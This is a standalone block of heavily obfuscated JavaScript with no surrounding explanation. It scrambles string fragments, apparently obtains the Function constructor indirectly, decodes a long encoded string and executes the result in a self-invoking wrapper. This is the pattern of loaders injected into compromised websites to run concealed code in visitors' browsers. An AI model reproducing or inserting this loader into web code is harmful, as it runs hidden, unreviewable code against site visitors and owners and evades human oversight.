;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})();
